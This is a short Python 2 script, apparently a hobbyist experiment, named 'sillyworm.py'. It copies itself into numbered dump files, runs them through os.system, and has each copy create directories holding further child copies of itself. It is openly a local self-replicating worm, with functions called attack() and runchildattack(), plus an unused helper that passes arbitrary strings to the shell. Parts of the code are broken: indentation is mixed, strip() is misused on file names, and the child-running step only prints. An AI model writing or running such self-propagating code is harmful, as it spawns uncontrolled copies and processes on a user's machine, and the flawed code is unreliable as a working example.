#!/usr/bin/python -

import os 
import thread

def main():
	print "My name : "+__file__
	initialfileexist = initialcheck()
	if initialfileexist == 0:
		attack()
	else:
		initsetup()

def initsetup():
	i = 0
	while i < 3:
		nf = "dump"+str(i)+".py"
		os.system("cat sillyworm.py > "+nf)
		i += 1
	i = 0
	while i < 3:
		nf = "dump"+str(i)+".py"
		print "Main creating\n"
		os.system("python "+nf)
		i += 1

def attack():
	print "Running "+os.getcwd()+"/"+os.path.basename(__file__)
	myfilename = os.path.basename(__file__)
	myfilename = myfilename.strip(".py")
	myfilenumber = int(myfilename.strip("dump"))
	if myfilenumber != 3:
		os.system("mkdir "+os.getcwd()+"/"+myfilename)
		print "Made "+os.getcwd()+"/"+myfilename
		while myfilenumber != 3:
			childfilename = "dump"+str(myfilenumber+1)+".py"
			os.system("cat "+myfilename+".py > ./"+myfilename+"/"+childfilename)
			print "made child "+myfilename+".py > ./"+myfilename+"/"+childfilename
			myfilenumber += 1
	runchildattack()

def runchildattack():
	cmd = ""
	childrentorun = []
	myfilename = os.path.basename(__file__)
	myfilename = myfilename.strip(".py")
	corecurrentdir = "."+os.path.basename(__file__).strip(myfilename+".py")+"/"+myfilename
	print "I want core = "+corecurrentdir
	for root, dirs, files in os.walk(".", topdown=False):
   		for name in files:
   			cmd = os.path.join(root, name)
     		if corecurrentdir in cmd:
     			print cmd
     			
def initialcheck():
	currfile = os.path.basename(__file__)
	if currfile == "sillyworm.py":
		return 1
	else:
		return 0

def bashit(cmd):
	print "Core running : "+cmd
	os.system(cmd)

if __name__ == "__main__":
	main()